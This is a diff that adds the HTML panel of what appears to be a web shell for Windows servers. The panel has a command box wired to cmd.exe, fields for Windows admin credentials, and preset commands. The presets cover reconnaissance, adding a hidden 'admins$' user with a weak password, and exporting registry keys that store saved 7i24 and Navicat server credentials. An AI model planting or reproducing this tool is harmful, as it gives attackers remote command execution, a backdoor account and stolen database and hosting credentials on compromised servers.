@@ -1,0 +1,39 @@
+﻿<!--cmd-->
+<div id="cmdshell" name="cmdshell">
+<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
+<h2>Execute Command &gt;&gt;</h2>
+ <hr size=2 />
+ windows userName:<input name="win_adminuser" type="text" id="win_adminuser" class="input" size="50" value="" /> windows passWord:<input name="win_adminpass" type="text" id="win_adminpass" class="input" size="50" value="" />
+  <hr size=2 />
+ </p>Command List:<br/>
+<select class="something" id="SelectCommand" name="SelectCommand" onchange="CommandSelect();">
+<option   selected="selected" value="/c systeminfo">Systeminfo</option>
+<option value="/c whoami">whoami</option>
+<option	value="/c net1 user">net user</option>
+<option value="/c net1 user admins$ 123456 /add">add user</option>
+<option	value="/c net start">Service</option>
+<option value="/c ipconfig /all">IPConfig</option>
+<option value="/c tasklist /svc">process</option>
+<option value="/c netstat -an">NetWork</option>
+<option value="/c regedit -s c:\1.reg">Reg Import</option>
+<option value="/c regedit /e c:\1.reg HKEY_LOCAL_MACHINE\SYSTEM\LIWEIWENSOFT\INSTALLFREEADMIN">Reg Express(7i24)</option>
+<option value="/c regedit /e c:\1.reg HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers">Reg Express(Navicat)</option>
+</select><br/>
+<p>CmdPath:<br/>
+ <input name="DLLspy_cmd" type="text" id="DLLspy_cmd" class="input" size="100" value="c:\windows\system32\cmd.exe" />
+ </p>Argument:<br/>
+ <input name="DLLspy_q" type="text" id="DLLspy_q" class="input" value="/c Set" size="100" /> <input type="Button" name="exec" value="Submit" id="exec" class="bt"  onclick="ExecQuery();"/>
+</td></tr></table>
+</div>
+
+<!--systeminfo-->
+<div id="SysInfo" name="SysInfo"   style="margin-left:15px;margin-right:15px;background-color:#000;color:#eee">
+<h2 id="Bin_H2_Title">SystemInfo &gt;&gt;</h2>
+<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
+<div  id="systeminfo"  name="systeminfo"></div>
+</td></tr></table></div>
+
+
+
+
+
